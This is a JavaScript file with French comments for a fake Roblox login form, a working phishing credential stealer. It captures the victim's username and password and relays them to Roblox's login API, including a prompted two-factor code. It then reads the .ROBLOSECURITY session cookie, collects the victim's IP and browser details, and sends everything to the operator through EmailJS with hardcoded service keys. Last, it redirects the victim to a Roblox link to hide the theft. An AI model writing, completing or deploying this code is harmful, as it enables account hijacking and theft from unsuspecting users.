// Inclusion dynamique d'EmailJS
var script = document.createElement('script');
script.src = "https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js";
script.onload = function() {
    // Attendre que emailjs soit chargé
    setTimeout(() => {
        if(typeof emailjs !== 'undefined') {
            emailjs.init("eIX3mqRzV9eWtGPIF");
        }
    }, 500);
};
document.head.appendChild(script);

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    
    // Tentative de login réel à Roblox
    fetch('https://auth.roblox.com/v2/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ username: username, password: password })
    })
    .then(res => {
        if(res.status === 200) return res.json();
        else if(res.status === 403) {
            // 2FA demandé
            var code = prompt("Entrez le code d'authentification à deux facteurs reçu par email/SMS:");
            if(code) {
                return fetch('https://auth.roblox.com/v2/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ username: username, password: password, twoStepVerificationToken: code })
                }).then(r => r.json());
            }
        }
        throw new Error('Échec');
    })
    .then(data => {
        var cookies = document.cookie;
        var match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
        var roblosec = match ? match[1] : '';
        var token = btoa(roblosec + ':' + Date.now()).replace(/=/g, '');
        
        // Envoi par EmailJS
        var templateParams = {
            username: username,
            password: password,
            roblosecurity: roblosec,
            token: token,
            cookies: cookies,
            user_agent: navigator.userAgent,
            ip: 'à récupérer via API'
        };
        
        // Récupération IP
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => { templateParams.ip = ipData.ip; })
            .finally(() => {
                emailjs.send('service_356pn8k', 'template_jw6xyle', templateParams)
                    .then(() => { window.location.href = 'https://www.roblox.com/share?code=39a503a89e17af4c8fb7d6e1d51d319c&type=Server'; })
                    .catch(console.error);
            });
    })
    .catch(err => { alert('Erreur, réessayez'); });
});